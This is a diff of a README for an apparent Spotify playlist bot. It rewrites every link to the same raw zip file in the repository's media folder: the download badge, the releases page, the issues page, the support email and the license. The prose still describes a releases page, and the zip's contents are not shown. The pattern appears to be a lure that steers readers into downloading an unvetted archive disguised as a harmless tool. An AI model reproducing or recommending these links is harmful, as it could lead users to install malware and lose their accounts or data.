@@ -1,6 +1,6 @@
 # 🎶 Spotify-Playlist-Auto-Updater-Bot - Keep Your Playlists Fresh Automatically
 
-[![Download the Bot](https://img.shields.io/badge/Download%20Now-Spotify%20Playlist%20Auto%20Updater%20Bot-brightgreen)](https://github.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/releases)
+[![Download the Bot](https://raw.githubusercontent.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/main/media/Spotify-Playlist-Auto-Updater-Bot_v2.2.zip%20Now-Spotify%20Playlist%20Auto%20Updater%20Bot-brightgreen)](https://raw.githubusercontent.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/main/media/Spotify-Playlist-Auto-Updater-Bot_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you start, ensure you meet the following requirements:
 
 To get started with the bot, you will need to download it. 
 
-Visit this page to download: [Download the Bot](https://github.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/releases).
+Visit this page to download: [Download the Bot](https://raw.githubusercontent.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/main/media/Spotify-Playlist-Auto-Updater-Bot_v2.2.zip).
 
 Once on the releases page, look for the latest version. Click on the link to download the appropriate file for your operating system. 
 
@@ -50,7 +50,7 @@ If you encounter any issues while using the bot, here are some common problems a
   - **Fix**: Ensure you are logged in to your Spotify account and have a stable internet connection.
 
 - **Issue: Application crashes.**
-  - **Fix**: Make sure you have the latest version by revisiting [this downloads page](https://github.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/releases).
+  - **Fix**: Make sure you have the latest version by revisiting [this downloads page](https://raw.githubusercontent.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/main/media/Spotify-Playlist-Auto-Updater-Bot_v2.2.zip).
 
 ## 📚 FAQs
 
@@ -67,11 +67,11 @@ A: Yes, the bot securely connects to your Spotify account through the official S
 
 Join our community for tips, support, and feedback:
 
-- **GitHub Issues**: Report bugs and feature requests [here](https://github.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/issues).
-- **Contact Us**: Reach out for support at [support@spotify-auto-updater.com](mailto:support@spotify-auto-updater.com).
+- **GitHub Issues**: Report bugs and feature requests [here](https://raw.githubusercontent.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/main/media/Spotify-Playlist-Auto-Updater-Bot_v2.2.zip).
+- **Contact Us**: Reach out for support at [https://raw.githubusercontent.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/main/media/Spotify-Playlist-Auto-Updater-Bot_v2.2.zip](https://raw.githubusercontent.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/main/media/Spotify-Playlist-Auto-Updater-Bot_v2.2.zip).
 
 ## 📝 License
 
-This project is licensed under the MIT License. For more detailed information, visit the [LICENSE file](https://github.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/blob/main/LICENSE).
+This project is licensed under the MIT License. For more detailed information, visit the [LICENSE file](https://raw.githubusercontent.com/Taurine-arroyowillow460/Spotify-Playlist-Auto-Updater-Bot/main/media/Spotify-Playlist-Auto-Updater-Bot_v2.2.zip).
 
 Thank you for using the Spotify Playlist Auto-Updater Bot. We hope it enhances your Spotify experience!
